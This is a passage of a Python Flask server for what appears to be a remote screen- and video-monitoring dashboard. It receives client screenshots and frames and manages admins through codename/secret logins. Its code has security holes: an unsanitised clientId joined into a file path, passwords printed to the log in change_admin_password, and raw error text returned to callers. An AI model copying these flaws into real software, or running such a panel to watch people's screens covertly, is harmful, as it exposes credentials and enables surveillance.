    except Exception as e:
        print(f"Error saving screenshot: {e}")
        return Response(f"Server error: {str(e)}", status=500)

@app.route('/api/view-screenshare')
def get_screenshot():
    try:
        client_id = request.args.get("clientId")
        screenshot_path_of_specific_client_to_send_in_web_dashboard = f"{SCREENSHARE_SCREENSHOT_PATH}{client_id}-latestscreenshot.png"
        
        if os.path.exists(screenshot_path_of_specific_client_to_send_in_web_dashboard):
            print(f"Serving screenshot from {screenshot_path_of_specific_client_to_send_in_web_dashboard}")
            # Use make_response to add no-cache headers
            response = make_response(send_file(screenshot_path_of_specific_client_to_send_in_web_dashboard, mimetype='image/png'))
            response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            return response
        else:
            print(f"Screenshot file not found at {screenshot_path_of_specific_client_to_send_in_web_dashboard}")
            return Response("No screenshot available", status=404)
    except Exception as e:
        print(f"Error serving screenshot: {e}")
        return Response(f"Server error: {str(e)}", status=500)





latest_frame = None
frame_lock = threading.Lock()

# Route to receive video frames from client
@app.route('/api/video-frame-from-client', methods=['POST'])
def receive_video_frame():
    global latest_frame
    frame_data = request.data  # Raw MJPEG frame from client
    with frame_lock:
        latest_frame = frame_data
    print(f"Received frame: {len(frame_data)} bytes")
    return jsonify({"status": "frame received"}), 200

# Generator function to stream video frames
def generate_frames():
    global latest_frame
    while True:
        with frame_lock:
            if latest_frame is not None:
                # Yield the frame in multipart format for streaming
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + latest_frame + b'\r\n')
            else:
                # Yield a placeholder if no frame is available yet
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + b'' + b'\r\n')
        time.sleep(0.1)  # Control frame rate (adjust as needed)

# Route to stream video to the web interface
@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# Route to serve the web interface
@app.route('/video')
def video_page():
    return render_template('video.html')






@app.route("/api/createAdmin", methods=["POST"])
@token_required
def createAdmin(decoded_token):
    if decoded_token['user']['role'] == 'superadmin':
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid input. Codename and secret are required."}), 400

        user_codename = data.get("codename")
        user_secret = data.get("secret")

        if not user_codename or not user_secret:
            return jsonify({"error": "Codename and secret are required."}), 400

        # Check if the codename already exists
        if Admin.query.filter_by(codename=user_codename).first():
            return jsonify({"error": "Admin with this codename already exists."}), 409

        # Add the new admin
        hashed_secret = bcrypt.hashpw(user_secret.encode('utf-8'), bcrypt.gensalt())
        new_admin = Admin(codename=user_codename, secret=hashed_secret, role="admin")
        db.session.add(new_admin)
        db.session.commit()

        return jsonify({"message": f"Admin {user_codename} added successfully."}), 201
    else:
        return jsonify({"error": "Access forbidden"}), 403






@app.route("/api/changeSuperAdminPassword", methods=["POST"])
@token_required
def change_super_admin_password(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin

    data = request.get_json()
    # Validate input data
    if not data:
        return jsonify({"error": "Invalid input. Please provide current password, new password, and confirmation."}), 400
    
    current_password = data.get('currentPassword')
    new_password = data.get('newPassword')
    confirm_password = data.get('confirmPassword')

    if not current_password or not new_password or not confirm_password:
        return jsonify({"error": "All fields are required."}), 400

    if new_password != confirm_password:
        return jsonify({"error": "New password and confirmation do not match."}), 400

    # Get the superadmin (codename = "admin") from the database
    superadmin = Admin.query.filter_by(codename='admin').first()
    if not superadmin:
        return jsonify({"error": "Superadmin not found."}), 404

    # Check if the current password matches the one stored in the database
    if not bcrypt.checkpw(current_password.encode('utf-8'), superadmin.secret):  # bcrypt expects bytes
        return jsonify({"error": "Current password is incorrect."}), 401

    # Hash the new password
    hashed_new_password = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt())  # Store as bytes
    superadmin.secret = hashed_new_password
    db.session.commit()

    return jsonify({"message": "Password changed successfully."}), 200




@app.route("/api/deleteAdmin", methods=["POST"])
@token_required
def deleteAdmin(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin

    try:
        data = request.get_json()
        if not data or 'user' not in data:
            return jsonify({"error": "Invalid request. 'user' field is required."}), 400

        admin_codename_to_delete = data['user']

        # Prevent deleting the default superadmin
        if admin_codename_to_delete == 'admin':
            return jsonify({"error": "Cannot delete the default superadmin."}), 403

        # Find the admin in the database
        admin_to_delete = Admin.query.filter_by(codename=admin_codename_to_delete).first()

        if not admin_to_delete:
            return jsonify({"error": "Admin not found."}), 404

        # Delete the admin
        db.session.delete(admin_to_delete)
        db.session.commit()

        return jsonify({"message": f"Admin '{admin_codename_to_delete}' deleted successfully."}), 200

    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500



@app.route("/api/editNickname", methods=["POST"])
@token_required
def editNickname(decoded_token):
    """
    Update the nickname of a client. Requires admin or superadmin privileges.
    """
    if decoded_token['user']['role'] not in ['admin', 'superadmin']:
        return jsonify({"error": "Access forbidden"}), 403

    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid input. JSON data required."}), 400

    client_id = data.get("client_id")
    new_nickname = data.get("nickname")

    if not client_id or not new_nickname or len(new_nickname.strip()) == 0:
        return jsonify({"error": "Valid client_id and nickname are required."}), 400

    try:
        client = ClientData.query.filter_by(client_id=client_id).first()
        if not client:
            return jsonify({"error": "Client not found."}), 404

        client.nickname = new_nickname.strip()
        db.session.commit()
        return jsonify({"success": "Nickname updated successfully."}), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500


@app.route("/api/changeAdminPassword", methods=["POST"])
@token_required
def change_admin_password(decoded_token):
    # Only allow superadmin to change password
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin
    data = request.get_json()
    print(data)
    if not data:
        return jsonify({"error": "Invalid input. Please provide current password, new password, and confirmation."}), 400

    current_password = data.get('currentPassword')
    new_password = data.get('newPassword')
    confirm_password = data.get('confirmPassword')
    # Validate input fields
    if not current_password or not new_password or not confirm_password:
        return jsonify({"error": "All fields are required."}), 400
    if new_password != confirm_password:
        return jsonify({"error": "New password and confirmation do not match."}), 400
    # Get the admin from the database (the admin whose password is to be changed)
    admin_codename = data.get('adminCodename')
    if not admin_codename:
        return jsonify({"error": "'adminCodename' is required."}), 400
    current_admin_object = Admin.query.filter_by(codename=admin_codename).first()
    if not current_admin_object:
        return jsonify({"error": "Admin not found."}), 404
    # Check if the current password matches the one stored in the database (for the superadmin)
    if not bcrypt.checkpw(current_password.encode('utf-8'), current_admin_object.secret):  # bcrypt check
        return jsonify({"error": "Current password is incorrect."}), 401
    # Hash the new password
    hashed_new_password = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt())  # Store as bytes
    current_admin_object.secret = hashed_new_password
    db.session.commit()
    return jsonify({"message": "Password changed successfully."}), 200



@app.route("/api/login-verify", methods=['POST'])
def login_verify():
    data = request.get_json()

    if data:
        user_codename = data.get("codename")
        user_secret = data.get("secret")

        if not user_codename or not user_secret:
            return jsonify({"error": "Codename and secret are required"}), 400

        # Query the database for the provided codename
        user_object = Admin.query.filter_by(codename=user_codename).first()

        if user_object and bcrypt.checkpw(user_secret.encode('utf-8'), user_object.secret):
            print("Authentication successful")
            
            token = generate_jwt(user_object.role,user_object.codename)

            # Include the token and the redirection path in the response
            return jsonify({
                "message": "Login successful",
                "token": token,
                "redirect": url_for('dashboard')
            }), 200
        else:
            return jsonify({"error": "Invalid codename or secret"}), 401

    return jsonify({"error": "Bad request"}), 400

if __name__ == '__main__':
    # Generate certificates using OpenSSL for local testing
    # openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout key.pem -out cert.pem -config config/localhost.cnf

    socketio.run(app, host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))

